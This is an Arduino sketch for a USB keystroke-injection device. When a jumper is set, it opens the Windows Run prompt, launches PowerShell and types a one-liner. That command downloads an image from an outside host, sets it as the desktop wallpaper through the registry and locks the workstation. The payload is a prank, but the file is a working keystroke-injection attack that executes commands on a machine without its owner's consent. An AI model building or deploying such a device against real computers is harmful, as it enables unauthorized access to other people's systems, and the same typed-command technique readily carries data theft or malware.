#include "Keyboard.h"

#define CONTROL_PIN 2

void setup() {
  pinMode(CONTROL_PIN,INPUT);
  Keyboard.begin();
}

void loop() {
    // Waut until jumper on pin D2 and GND
    while(digitalRead(CONTROL_PIN) == false){}
    // Open "Run" prompt
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    // Wait for "Run" prompt to open
    delay(100);
    Keyboard.println("powershell");
    // Wait for Powershell to open
    delay(100);
    // Paste and execute the Hasselhoff fiesta
    Keyboard.println(R"($pathToJpg=("{0}{1}" -f (Get-Location),"/.hoff.jpg");Invoke-WebRequest "https://i.imgur.com/4VdAwU5.jpg" -OutFile $pathToJpg;reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d $pathToJpg /f;For($i=0;$i -le 100;$i++){rundll32.exe user32.dll,UpdatePerUserSystemParameters};Start-Process powershell -ArgumentList "sleep 1;rundll32.exe user32.dll,LockWorkStation" -WindowStyle Hidden;Exit;)");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    // Wait indefinitely
    while(true){}
}
